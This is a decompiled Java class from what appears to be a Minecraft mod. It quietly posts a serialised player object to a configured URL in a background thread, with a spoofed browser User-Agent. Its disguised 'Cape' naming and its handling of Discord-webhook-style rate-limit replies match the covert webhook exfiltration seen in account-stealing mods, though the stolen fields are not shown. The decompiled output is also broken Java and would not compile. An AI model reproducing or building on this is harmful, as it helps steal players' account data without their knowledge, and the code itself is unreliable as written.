package Mood.AndyConnection;

import com.google.gson.*;
import com.google.gson.annotations.*;
import java.util.*;

public class UTILS
{
    private static final Gson gson;
    private final String url;
    
    static {
        gson = new Gson();
    }
    
    public UTILS(final String url) {
        this.url = url;
    }
    
    public void sendMessage(final AndyPlayer andyPlayer) {
        new Thread(this::lambda$0).start();
    }
    
    private void lambda$0(final AndyPlayer andyPlayer) {
        final String body = UUIDChecker.post(this.url).acceptJson().contentType("application/json").header("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11").send(UTILS.gson.toJson(andyPlayer)).body();
        if (!body.isEmpty()) {
            final CapeResponse capeResponse = (CapeResponse)UTILS.gson.fromJson(body, CapeResponse.class);
            if (capeResponse.getMessage().equals("You are being rate limited.")) {
                throw new CapeException(capeResponse.getMessage());
            }
        }
    }
    
    public class CapeException extends RuntimeException
    {
        final UTILS this$0;
        
        public CapeException(final UTILS this$0, final String s) {
            this.this$0 = this$0;
            super(s);
        }
    }
    
    public static class CapeResponse
    {
        boolean global;
        String message;
        @SerializedName("retry_after")
        int retryAfter;
        List username;
        List embeds;
        List connection;
        
        public CapeResponse() {
            this.username = new ArrayList();
            this.embeds = new ArrayList();
            this.connection = new ArrayList();
        }
        
        public String getMessage() {
            return this.message;
        }
        
        public int getRetryAfter() {
            return this.retryAfter;
        }
        
        public List getUsername() {
            return this.username;
        }
        
        public List getEmbeds() {
            return this.embeds;
        }
        
        public List getConnection() {
            return this.connection;
        }
    }
}
